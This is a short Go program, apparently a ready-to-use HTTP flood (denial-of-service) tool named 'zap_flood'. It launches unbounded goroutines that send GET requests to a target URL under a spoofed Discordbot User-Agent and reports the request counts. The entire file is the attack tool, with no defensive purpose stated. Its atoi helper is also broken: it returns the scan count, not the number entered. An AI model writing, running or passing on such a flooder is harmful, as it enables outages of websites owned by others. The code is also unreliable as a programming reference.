package main

import (
	"fmt"
	"net/http"
	"os"
	"sync/atomic"
	"time"
	"runtime"
)

var counter uint64

func flood(target string, duration int) {
	client := &http.Client{
		Transport: &http.Transport{
			MaxIdleConnsPerHost: 10000,
		},
		Timeout: time.Second * 5,
	}

	end := time.Now().Add(time.Duration(duration) * time.Second)

	for time.Now().Before(end) {
		go func() {
			req, _ := http.NewRequest("GET", target, nil)
			req.Header.Set("User-Agent", "Discordbot/2.0 (+https://discordapp.com)")
			resp, err := client.Do(req)
			if err == nil {
				resp.Body.Close()
			}
			atomic.AddUint64(&counter, 1)
		}()
	}
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: zap_flood <url> <duration>")
		return
	}
	target := os.Args[1]
	duration := atoi(os.Args[2])

	fmt.Printf("Launching HTTP flood on %s for %ds using %d threads\n", target, duration, runtime.NumCPU())

	for i := 0; i < runtime.NumCPU(); i++ {
		go flood(target, duration)
	}

	ticker := time.NewTicker(5 * time.Second)
	done := time.After(time.Duration(duration) * time.Second)

	var lastCount uint64

loop:
	for {
		select {
		case <-ticker.C:
			now := atomic.LoadUint64(&counter)
			rps := now - lastCount
			lastCount = now
			fmt.Printf("[ZAP FLOOD] Total: %d | RPS: %d\n", now, rps)
		case <-done:
			break loop
		}
	}
}

func atoi(s string) int {
	i, _ := fmt.Sscanf(s, "%d", new(int))
	return i
}
